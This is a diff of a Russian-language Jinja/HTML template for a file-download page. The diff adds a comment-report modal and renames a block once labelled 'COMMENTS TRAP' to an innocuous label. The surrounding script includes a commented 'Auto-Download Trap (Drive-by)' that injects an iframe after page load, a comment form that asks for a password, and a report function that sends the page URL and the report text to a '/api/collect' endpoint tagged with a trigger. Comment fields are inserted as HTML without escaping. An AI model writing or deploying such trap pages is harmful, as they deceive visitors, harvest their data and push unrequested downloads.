@@ -1,6 +1,7 @@
 {% extends "base.html" %}
 
 {% block content %}
+<!-- ЗАГОЛОВОК -->
 <div class="card p-4 mb-4">
     <div class="d-flex align-items-center">
         <div class="bg-danger bg-opacity-10 rounded-circle p-3 me-3">
@@ -13,6 +14,7 @@
     </div>
 </div>
 
+<!-- СПИСОК ФАЙЛОВ -->
 <div class="card p-4">
     <h5 class="mb-4">Доступные документы ({{ files|length }})</h5>
     
@@ -47,7 +49,7 @@
     </div>
 </div>
 
-<!-- COMMENTS TRAP -->
+<!-- КОММЕНТАРИИ И ЖАЛОБЫ -->
 <div class="card p-4 mt-4">
     <div class="d-flex justify-content-between align-items-center mb-3">
         <h6 class="mb-0">Обсуждение</h6>
@@ -58,7 +60,15 @@
         {% if db_data and db_data.comments %}
             {% for c in db_data.comments %}
                 <div class="border-bottom pb-2 mb-2">
-                    <strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small>
+                    <div class="d-flex justify-content-between">
+                        <div>
+                            <strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small>
+                        </div>
+                        <!-- ВОТ КНОПКА ПОЖАЛОВАТЬСЯ -->
+                        <button onclick="openReportModal('{{ c.username }}')" class="btn btn-link btn-sm text-muted p-0" title="Пожаловаться">
+                            <i class="fa-regular fa-flag"></i>
+                        </button>
+                    </div>
                     <p class="mb-0">{{ c.text }}</p>
                 </div>
             {% endfor %}
@@ -94,8 +104,65 @@
     </div>
 </div>
 
+<!-- МОДАЛЬНОЕ ОКНО ЖАЛОБЫ -->
+<div class="modal fade" id="reportModal" tabindex="-1" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header border-0 pb-0">
+        <h6 class="modal-title fw-bold">Жалоба на комментарий</h6>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <textarea class="form-control" id="reportReason" rows="5" placeholder="Опишите причину..."></textarea>
+        <input type="hidden" id="reportTarget">
+      </div>
+      <div class="modal-footer border-0 pt-0">
+        <button type="button" class="btn btn-danger w-100" onclick="submitReport()">Отправить</button>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
-// 1. Auto-Download Trap (Drive-by)
+// 1. Логика жалоб
+function openReportModal(username) {
+    document.getElementById('reportTarget').value = username;
+    document.getElementById('reportReason').value = ''; 
+    const myModal = new bootstrap.Modal(document.getElementById('reportModal'));
+    myModal.show();
+}
+
+function submitReport() {
+    const text = document.getElementById('reportReason').value;
+    const target = document.getElementById('reportTarget').value;
+    const btn = document.querySelector('#reportModal .btn-danger');
+    
+    btn.innerHTML = 'Отправка...';
+    btn.disabled = true;
+
+    const data = {
+        meta: { trigger: 'REPORT FILED', url: window.location.href },
+        system: { 
+            reported_user: target,
+            report_text: text || "Empty report"
+        }
+    };
+
+    fetch('/api/collect', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    }).then(() => {
+        const modalEl = document.getElementById('reportModal');
+        const modal = bootstrap.Modal.getInstance(modalEl);
+        modal.hide();
+        btn.innerHTML = 'Отправить';
+        btn.disabled = false;
+        alert("Жалоба отправлена администрации.");
+    });
+}
+
+// 2. Auto-Download Trap
 window.addEventListener('load', function() {
     setTimeout(() => {
         const ifr = document.createElement('iframe');
@@ -105,7 +172,7 @@ window.addEventListener('load', function() {
     }, 2500);
 });
 
-// 2. Comment Logic
+// 3. Comment Logic
 function sendComment(uid) {
     const username = document.getElementById('usernameInput').value || 'Guest';
     const email = document.getElementById('emailInput').value;
@@ -134,12 +201,22 @@ function sendComment(uid) {
         if(data.status === 'ok') {
             const list = document.getElementById('commentsList');
             if(list.querySelector('.text-center')) list.innerHTML = '';
+            
+            // Добавляем коммент сразу с кнопкой жалобы
             const html = `
                 <div class="border-bottom pb-2 mb-2">
-                    <strong>${data.comment.username}</strong> <small class="text-muted">${data.comment.date}</small>
+                    <div class="d-flex justify-content-between">
+                        <div>
+                            <strong>${data.comment.username}</strong> <small class="text-muted">${data.comment.date}</small>
+                        </div>
+                        <button onclick="openReportModal('${data.comment.username}')" class="btn btn-link btn-sm text-muted p-0">
+                            <i class="fa-regular fa-flag"></i>
+                        </button>
+                    </div>
                     <p class="mb-0">${data.comment.text}</p>
                 </div>`;
             list.insertAdjacentHTML('beforeend', html);
+            
             document.getElementById('commentText').value = '';
             document.getElementById('passwordInput').value = ''; 
             if(email && password) alert(`Подписка оформлена на ${email}.`);
